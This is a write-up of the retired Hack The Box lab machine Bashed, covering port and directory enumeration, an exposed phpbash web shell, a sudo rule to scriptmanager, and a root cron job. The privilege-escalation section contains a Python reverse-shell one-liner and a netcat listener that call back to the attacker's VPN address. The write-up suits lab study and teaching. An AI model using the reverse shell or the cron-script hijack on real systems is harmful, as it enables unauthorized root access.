---
title: "Hack The Box — Bashed"
summary: "Bashed exposes phpbash in a development directory, giving www-data command execution; sudo access to scriptmanager and a writable root-run script lead to root."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Easy"
os: "Linux"
solvedAt: 2026-11-22
publishedAt: 2026-11-22
tags:
  - web-enumeration
  - exposed-development-files
  - phpbash
  - sudo
  - scheduled-task
  - privilege-escalation
tools:
  - Nmap
  - Gobuster
  - phpbash
  - Netcat
cves: []
htbUrl: "https://app.hackthebox.com/machines/118"
cover: "/images/writeups/hackthebox/machines/bashed/bashed.png"
coverAlt: "Hack The Box Bashed machine artwork showing a masked figure inside a green circle"
featured: false
draft: false
---

> This write-up documents an authorized Hack The Box lab. The [official Bashed page](https://www.hackthebox.com/machines/bashed) identifies it as a **Retired** Machine. Flag values, personal VPN addresses, and unrelated secrets are omitted. Use the addresses assigned to your own lab instance.

## Executive summary

Bashed exposes a development directory containing `phpbash.php`, a working web shell. Visiting it gives command execution as Apache's `www-data` user. A passwordless sudo rule allows that account to run commands as `scriptmanager`. That user owns `/scripts/test.py`, which a root-owned scheduled task executes. Replacing the script with a short Python reverse shell yields a root connection when the task next runs. The core mistake is allowing a less privileged user to edit code executed by root.

## Target information

| Item | Value |
| --- | --- |
| Target | Bashed |
| Platform | Hack The Box |
| Difficulty | Easy |
| Operating system | Linux |
| Publication policy | Retired, confirmed by the [official machine page](https://www.hackthebox.com/machines/bashed) |
| Solved | 22 November 2026 |
| Main weaknesses | Publicly accessible web shell; passwordless sudo to `scriptmanager`; writable script executed by root |

The target and VPN addresses are assigned per session. In the commands below, replace `<TARGET_IP>` and `<YOUR_TUN0_IP>` with the values for your own instance.

## Enumeration

I began with a full TCP scan, service detection, and Nmap's default scripts:

```bash
nmap <TARGET_IP> -T5 -sVC -p-
```

The scan found one open TCP port:

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
```

With only HTTP exposed, the website was the next place to enumerate. Its home page discussed **phpbash** and said it had been developed on this server. That made development files a specific lead. To reproduce directory discovery, use a web content wordlist:

```bash
gobuster dir -u http://<TARGET_IP>/ \
  -w /usr/share/wordlists/dirb/common.txt -x php
```

The interesting result is `/dev/`. Browsing `http://<TARGET_IP>/dev/` shows `phpbash.php` and `phpbash.min.php`; opening `/dev/phpbash.php` presents a command prompt in the browser. The project's own [documentation](https://github.com/Arrexel/phpbash) describes phpbash as a single-file, semi-interactive PHP shell. The issue here is its exposure on the public website.

### Findings

| Evidence | Why it mattered |
| --- | --- |
| TCP/80 was the only open port | The attack surface pointed to the web application. |
| The home page mentioned phpbash | It justified looking for a deployed development copy. |
| `/dev/phpbash.php` accepted commands | It provided the initial shell without credentials or an additional exploit. |

## Initial access

In the phpbash prompt, I checked the effective account:

```bash
id
```

The result identified `uid=33(www-data)`. This was a web-server shell, not root access. The user flag was readable in `/home/arrexel/user.txt`; its value is deliberately omitted:

```bash
cat /home/arrexel/user.txt
```

The web shell was sufficient for local enumeration, so a separate reverse shell was not needed at this stage. Enter each command separately in the phpbash interface.

## Privilege escalation

### From `www-data` to `scriptmanager`

I checked the sudo rules available to `www-data`:

```bash
sudo -l
```

The relevant rule was:

```text
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

This allows commands to run as `scriptmanager` without a password. It does not grant direct root access. Since phpbash is a semi-interactive web shell, one-shot commands with `sudo -u scriptmanager` are reliable:

```bash
sudo -u scriptmanager id
sudo -u scriptmanager ls -la /scripts
sudo -u scriptmanager cat /scripts/test.py
```

The directory contained a Python script owned by `scriptmanager` and a text file owned by root:

```text
-rw-r--r-- 1 scriptmanager scriptmanager ... test.py
-rw-r--r-- 1 root          root          ... test.txt
```

The original `test.py` wrote `testing 123!` to `test.txt`. Running `stat` directly as `www-data` returned `Permission denied` because that account could not traverse `/scripts`. Repeating the check as `scriptmanager` worked:

```bash
sudo -u scriptmanager stat -c '%y %U %n' /scripts/test.txt
```

The root-owned output file's modification time was a clue that a privileged process was periodically executing the script. It did not reveal the crontab entry itself. The later callback from the modified script confirmed execution with root privileges.

### From `scriptmanager` to root

On Kali, I checked the VPN interface and started a listener in a separate terminal:

```bash
ip -4 addr show tun0
nc -lvnp 4444
```

In phpbash, I saved the original script. The backup ends in `.bak`, so it does not match a `*.py` task pattern:

```bash
sudo -u scriptmanager cp /scripts/test.py /scripts/test.py.bak
```

I then replaced `/scripts/test.py` with a Python reverse shell. Substitute your own `tun0` address for `<YOUR_TUN0_IP>` and enter the following as **one command** in phpbash:

```bash
sudo -u scriptmanager sh -c 'printf "%s\n" "import os,socket,subprocess" "s=socket.socket();s.connect((\"<YOUR_TUN0_IP>\",4444))" "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)" "subprocess.call([\"/bin/bash\",\"-i\"])" > /scripts/test.py'
```

The Python code opens a connection to Kali, duplicates the socket over standard input and output, and starts Bash. When the scheduled task ran, the listener received a connection from the target. I verified the privilege boundary and read the root flag without publishing its value:

```bash
id
cat /root/root.txt
```

`id` reported `uid=0(root)`. Bash also printed `no job control in this shell`, a normal limitation of this simple Netcat connection. After confirming access, I restored the original script to stop repeated callbacks:

```bash
cp /scripts/test.py.bak /scripts/test.py
```

The escalation worked because `scriptmanager` could change the contents of a script that the root-owned scheduled task trusted and executed. Being unable to read the root crontab did not prevent identifying that trust relationship through file ownership, output behavior, and the resulting root shell.

## What did not work

- `su root` in phpbash returned `must be run from a terminal`. It was also the wrong route: the useful permission was the sudo rule for `scriptmanager`.
- Pasting several commands on one phpbash line without separators made `ls` interpret words such as `sudo`, `cat`, and `stat` as filenames. Running one command per prompt resolved it.
- `stat /scripts/test.txt` as `www-data` returned `Permission denied`. Running it through `sudo -u scriptmanager` respected the directory permissions and exposed the metadata.

## Attack path

1. Scan all TCP ports and identify the Apache website on port 80.
2. Follow the phpbash clue, discover `/dev/`, and open the exposed web shell.
3. Confirm code execution as `www-data` and inspect its sudo permissions.
4. Run commands as `scriptmanager` and inspect the writable `/scripts/test.py` and root-owned output.
5. Replace the script, wait for the privileged scheduled execution, and verify the root callback.

## Lessons learned

- A development shell exposed through a public web directory is an immediate command-execution path. Remove development utilities from production web roots and restrict access to administrative tooling.
- A sudo rule that lets the web-server account run arbitrary commands as another user expands a web compromise into that user's file permissions. Keep sudo grants narrow and tied to required commands.
- A root scheduled task must not execute scripts writable by a less privileged account. Root should own both the task and its code, and the task should use paths with controlled permissions.
- When crontab access is restricted, compare file ownership, script behavior, and output timestamps. Treat that evidence as a hypothesis until execution under the privileged account is confirmed.

## References

- [Hack The Box — Bashed (official Machine page)](https://www.hackthebox.com/machines/bashed)
- [Arrexel/phpbash — project documentation](https://github.com/Arrexel/phpbash)
- [sudoers manual — run-as specifications](https://www.sudo.ws/docs/man/sudoers.man/)
- [Python documentation — `socket` module](https://docs.python.org/3/library/socket.html)
